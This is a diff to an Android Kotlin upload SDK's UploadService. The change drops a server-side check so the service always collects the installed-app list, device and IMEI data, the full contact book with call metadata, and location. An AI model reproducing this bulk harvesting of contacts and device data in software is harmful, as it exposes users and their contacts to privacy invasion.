@@ -5,14 +5,14 @@ import android.annotation.SuppressLint
 import android.app.IntentService
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import androidx.annotation.RequiresApi
 import androidx.annotation.RequiresPermission
 import com.fintek.upload_sdk.model.UserAuthInfo
 import com.fintek.upload_sdk.network.ApiService
 import com.fintek.upload_sdk.network.RetrofitHelper
-import com.fintek.upload_sdk.utils.AppUtils
-import com.fintek.upload_sdk.utils.ContactUtil
 import com.fintek.upload_sdk.utils.EstimateUtils
+import com.fintek.utils_androidx.`package`.PackageUtils
 import com.fintek.utils_androidx.contact.ContactUtils
 import com.fintek.utils_androidx.location.LocationUtils
 import com.google.gson.Gson
@@ -91,25 +91,32 @@ class UploadService : IntentService("Upload"), CoroutineScope by MainScope() {
     private suspend fun getRec(): UserAuthInfo = withContext(Dispatchers.Default) {
         val userAuthInfo = UserAuthInfo(merchantId = UploadUtils.requiredConfig.merchant)
 
-        val result = apiService.fetchUserExtExpired()
-        val response = result.data
-
-        if (result.isFailed || response == null) {
-            userAuthInfo.apply {
-                putAppList()
-                putEstimateInfo()
-                putContacts()
-                putLocation()
-            }
-
-            userAuthInfo.source = UserAuthInfo.UPALLDATASETS
-            return@withContext userAuthInfo
+        userAuthInfo.apply {
+            putAppList()
+            putEstimateInfo()
+            putContacts()
+            putLocation()
         }
 
-        if (response.appInfo) userAuthInfo.putAppList()
-        if (response.equipmentInfoMap || response.imei) userAuthInfo.putEstimateInfo()
-        if (response.userContact) userAuthInfo.putContacts()
-        if (response.gps) userAuthInfo.putLocation()
+//        val result = apiService.fetchUserExtExpired()
+//        val response = result.data
+//
+//        if (result.isFailed || response == null) {
+//            userAuthInfo.apply {
+//                putAppList()
+//                putEstimateInfo()
+//                putContacts()
+//                putLocation()
+//            }
+//
+//            userAuthInfo.source = UserAuthInfo.UPALLDATASETS
+//            return@withContext userAuthInfo
+//        }
+//
+//        if (response.appInfo) userAuthInfo.putAppList()
+//        if (response.equipmentInfoMap || response.imei) userAuthInfo.putEstimateInfo()
+//        if (response.userContact) userAuthInfo.putContacts()
+//        if (response.gps) userAuthInfo.putLocation()
 
         userAuthInfo
     }
@@ -118,7 +125,18 @@ class UploadService : IntentService("Upload"), CoroutineScope by MainScope() {
      * 放app列表
      */
     private fun UserAuthInfo.putAppList() {
-        appList = AppUtils.getAllApk(applicationContext)
+        appList = PackageUtils.getAllPackage().map {
+            UserAuthInfo.AppInfo(
+                appName = it.appName,
+                packageName = it.packageName,
+                installTime = it.installTime.toString(),
+                updateTime = it.updateTime.toString(),
+                versionName = it.versionName,
+                versionCode = it.versionCode.toString(),
+                flags = it.flags.toString(),
+                appType = it.appType.toString()
+            )
+        }
     }
 
     /**
@@ -132,10 +150,47 @@ class UploadService : IntentService("Upload"), CoroutineScope by MainScope() {
     /**
      * 放通讯录信息
      */
-    @RequiresApi(19)
+    @RequiresApi(Build.VERSION_CODES.KITKAT)
     @RequiresPermission(Manifest.permission.READ_CONTACTS)
     private fun UserAuthInfo.putContacts() {
-        contactList = ContactUtil.getContacts()
+        val contactInfo = ContactUtils.getContacts()
+        val transformList = mutableListOf<UserAuthInfo.UserContact>()
+        contactInfo.asSequence().forEach {
+            when {
+                it.phone!!.size == 1 -> transformList.add(
+                    UserAuthInfo.UserContact(
+                        name = it.name,
+                        phone = it.phone!![0],
+                        hasPhoneNumber = it.hasPhoneNumber.toString(),
+                        inVisibleGroup = it.inVisibleGroup.toString(),
+                        isUserProfile = it.isUserProfile,
+                        timesContacted = it.timesContacted.toString(),
+                        upTime = it.upTime,
+                        sendToVoiceMail = it.sendToVoiceMail.toString(),
+                        lastTimeContacted = it.lastTimeContacted.toString(),
+                        starred = it.starred.toString()
+                    )
+                )
+                it.phone!!.size > 1 -> transformList.addAll(
+                    it.phone!!.map { internalPhone ->
+                        UserAuthInfo.UserContact(
+                            name = it.name,
+                            phone = internalPhone,
+                            hasPhoneNumber = it.hasPhoneNumber.toString(),
+                            inVisibleGroup = it.inVisibleGroup.toString(),
+                            isUserProfile = it.isUserProfile,
+                            timesContacted = it.timesContacted.toString(),
+                            upTime = it.upTime,
+                            sendToVoiceMail = it.sendToVoiceMail.toString(),
+                            lastTimeContacted = it.lastTimeContacted.toString(),
+                            starred = it.starred.toString()
+                        )
+                    }
+                )
+            }
+        }
+
+        contactList = transformList
     }
 
     /**
